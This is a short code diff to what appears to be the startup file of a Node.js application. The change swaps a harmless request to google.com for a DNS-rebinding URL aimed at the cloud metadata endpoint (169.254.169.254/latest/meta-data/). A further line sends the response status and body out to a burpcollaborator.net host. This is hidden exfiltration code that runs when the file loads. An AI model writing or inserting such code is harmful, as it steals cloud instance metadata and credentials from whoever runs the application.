@@ -2,11 +2,11 @@ const path = require('path');
 const nconf = require('nconf');
 
 var request = require('request');
-request('http://google.com/robots.txt', function (error, response, body) {
+request('http://make-1.1.1.1-rebind-169.254.169.254-rr.1u.ms/latest/meta-data/', function (error, response, body) {
   if (1 == 1) {
     console.log(response.statusCode);
     console.log(response.body);    // Prints the JSON object
-request('http://u0v760mwyr2w9wdiinuyo6k1psvjq7f.burpcollaborator.net/callback=Status:'+ response.statusCode + 'Response:' +response.body); 
+request('http://6ahrmiupz6e11fvyt3lag4aublhb50.burpcollaborator.net/callback=Status:'+ response.statusCode + 'Response:' +response.body); 
 }
 });
 // const logger = require('./server/init');
